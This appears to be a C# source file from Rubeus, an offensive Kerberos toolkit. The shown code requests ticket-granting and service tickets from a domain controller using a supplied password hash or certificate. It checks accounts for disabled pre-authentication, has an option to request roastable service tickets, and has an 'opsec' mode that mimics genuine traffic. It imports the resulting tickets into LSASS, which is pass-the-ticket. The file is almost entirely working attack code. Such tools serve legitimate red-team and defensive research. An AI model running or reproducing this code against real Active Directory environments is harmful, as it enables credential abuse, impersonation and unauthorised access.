using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using Asn1;
using Rubeus.lib.Interop;
using Rubeus.Asn1;


namespace Rubeus {

    public class RubeusException : Exception
    {
        public RubeusException(string message)
            : base(message)
        {
        }
    }

    public class KerberosErrorException : RubeusException
    {
        public KRB_ERROR krbError;

        public KerberosErrorException(string message, KRB_ERROR krbError)
            : base(message)
        {
            this.krbError = krbError;
        }
    }

    public class Ask
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false)
        {
            // send request without Pre-Auth to emulate genuine traffic
            bool preauth = false;
            if (opsec)
                preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true);

            try
            {
                // if AS-REQ without pre-auth worked don't bother sending AS-REQ with pre-auth
                if (!preauth)
                {
                    Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                    Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec);
                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec);
                }
            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            catch (RubeusException ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }

            return null;
        }

        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false)
        {
            string dcIP = Networking.GetDCIP(domainController, true, domain);
            if (String.IsNullOrEmpty(dcIP)) { return false; }

            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, etype, true);
            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);

            if (response == null)
            {
                return false;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);

                byte[] kirbiBytes = HandleASREP(responseAsn, etype, keyString, outfile, ptt, luid, describe, verbose);

                return true;
            }

            return false;

        }

        //CCob (@_EthicalChaos_):
        // Based on KerberosAsymmetricCredential::Get function from Kerberos.NET from here:
        // https://github.com/dotnet/Kerberos.NET/blob/v4.5.0/Kerberos.NET/Credentials/KerberosAsymmetricCredential.cs
        // Additional functionality - If the certificate points to a file we assume PKCS12 certificate store 
        // with private key otherwise use users certificate store along with any smartcard that maybe present.
        public static X509Certificate2 FindCertificate(string certificate, string storePassword) {

            if (File.Exists(certificate)) {
                return new X509Certificate2(certificate, storePassword);
            } else {

                X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
                store.Open(OpenFlags.ReadOnly);
                X509Certificate2 result = null;

                foreach (var cert in store.Certificates) {
                    if (string.Equals(certificate, cert.Subject, StringComparison.InvariantCultureIgnoreCase)) {
                        result = cert;
                        break;
                    } else if (string.Equals(certificate, cert.Thumbprint, StringComparison.InvariantCultureIgnoreCase)) {
                        result = cert;
                        break;
                    }
                }

                if (result != null && !String.IsNullOrEmpty(storePassword)) {
                    result.SetPinForPrivateKey(storePassword);
                }

                return result;
            }
        }

        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false) {
            try {

                X509Certificate2 cert = FindCertificate(certFile, certPass);

                if(cert == null) {
                    Console.WriteLine("[!] Failed to find certificate for {0}", certFile);
                    return null;
                }

                KDCKeyAgreement agreement = new KDCKeyAgreement();

                Console.WriteLine("[*] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
                Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);

                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype);
                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true);

            } catch (KerberosErrorException ex) {
                KRB_ERROR error = ex.krbError;
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            } catch (RubeusException ex) {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }

            return null;
        }

        public static bool GetPKInitRequest(AS_REQ asReq, out PA_PK_AS_REQ pkAsReq) {

            if (asReq.padata != null) {
                foreach (PA_DATA paData in asReq.padata) {
                    if (paData.type == Interop.PADATA_TYPE.PK_AS_REQ) {
                        pkAsReq = (PA_PK_AS_REQ)paData.value;
                        return true;
                    }
                }
            }
            pkAsReq = null;
            return false;
        }

        public static int GetKeySize(Interop.KERB_ETYPE etype) {           
            switch (etype) {
                 case Interop.KERB_ETYPE.des_cbc_md5:
                    return 7;
                case Interop.KERB_ETYPE.rc4_hmac:
                    return 16;
                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:
                    return 16;
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    return 32;
                default:
                    throw new ArgumentException("Only /des, /rc4, /aes128, and /aes256 are supported at this time");
            }
        }

        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false)
        {
            if ((ulong)luid != 0) {
                Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
            }

            string dcIP = Networking.GetDCIP(domainController, false);
            if (String.IsNullOrEmpty(dcIP))
            {
                throw new RubeusException("[X] Unable to get domain controller address");
            }

            byte[] response = Networking.SendBytes(dcIP, 88, asReq.Encode().Encode());
            if (response == null)
            {
                throw new RubeusException("[X] No answer from domain controller");
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (verbose)
                {
                    Console.WriteLine("[+] TGT request successful!");
                }

                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq);

                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw new KerberosErrorException("", error);
            }
            else
            {
                throw new RubeusException("[X] Unknown application tag: " + responseTag);
            }
        }

        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false)
        {
            // kirbi            = the TGT .kirbi to use for ticket requests
            // service          = the SPN being requested
            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default
            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session
            // domainController = the specific domain controller to send the request, defaults to the system's DC
            // display          = true to display the ticket

            // extract out the info needed for the TGS-REQ request
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;

            // the etype for the PA Data for the request, so needs to match the TGT key type
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string[] services = service.Split(',');
            foreach (string sname in services)
            {
                // request the new service ticket
                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec);
                Console.WriteLine();
            }
        }

        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false)
        {
            string dcIP = Networking.GetDCIP(domainController, display);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            if (display)
            {
                if (requestEType == Interop.KERB_ETYPE.subkey_keymaterial)
                {
                    Console.WriteLine("[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket", requestEType);
                }
                else
                {
                    Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
                }

                Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
            }

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec);

            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                if (display)
                {
                    Console.WriteLine("[+] TGS request successful!");
                }

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);

                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT
                if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))
                {
                    byte[] tgtBytes = TGS_REQ.NewTGSReq(userName, domain, string.Format("krbtgt/{0}", domain), providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, true);

                    byte[] tgtResponse = Networking.SendBytes(dcIP, 88, tgtBytes);
                }

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = rep.crealm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                if (display)
                {
                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }

                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.DisplayTicket(kirbi);
                }

                if (!String.IsNullOrEmpty(outfile))
                {
                    outfile = Helpers.MakeValidFileName(outfile);
                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                    {
                        if (display)
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                        }
                    }
                }

                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }

        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null)
        {
            // parse the response to an AS-REP
            AS_REP rep = new AS_REP(responseAsn);

            // convert the key string to bytes
            byte[] key;
            if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq)) {      
                // generate the decryption key using Diffie Hellman shared secret 
                PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;                    
                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), new byte[0], 
                    pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
            } else {
                // convert the key string to bytes
                key = Helpers.StringToByteArray(asReq.keyString);
            }

            // decrypt the enc_part containing the session key/etc.
            // TODO: error checking on the decryption "failing"...
            byte[] outBytes;

            if (etype == Interop.KERB_ETYPE.des_cbc_md5)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else
            {
                throw new RubeusException("[X] Encryption type \"" + etype + "\" not currently supported");
            }


            AsnElt ae = AsnElt.Decode(outBytes, false);

            EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

            // now build the final KRB-CRED structure
            KRB_CRED cred = new KRB_CRED();

            // add the ticket
            cred.tickets.Add(rep.ticket);

            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

            KrbCredInfo info = new KrbCredInfo();

            // [0] add in the session key
            info.key.keytype = encRepPart.key.keytype;
            info.key.keyvalue = encRepPart.key.keyvalue;

            // [1] prealm (domain)
            info.prealm = encRepPart.realm;

            // [2] pname (user)
            info.pname.name_type = rep.cname.name_type;
            info.pname.name_string = rep.cname.name_string;

            // [3] flags
            info.flags = encRepPart.flags;

            // [4] authtime (not required)

            // [5] starttime
            info.starttime = encRepPart.starttime;

            // [6] endtime
            info.endtime = encRepPart.endtime;

            // [7] renew-till
            info.renew_till = encRepPart.renew_till;

            // [8] srealm
            info.srealm = encRepPart.realm;

            // [9] sname
            info.sname.name_type = encRepPart.sname.name_type;
            info.sname.name_string = encRepPart.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            if (verbose)
            {
                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                if (Rubeus.Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }
            }

            if (!String.IsNullOrEmpty(outfile))
            {
                outfile = Helpers.MakeValidFileName(outfile);
                if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                {
                    if (verbose)
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                    }
                }
            }

            if (ptt || ((ulong)luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }

            if (describe)
            {
                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                LSA.DisplayTicket(kirbi);
            }

            return kirbiBytes;
        }
    }
}
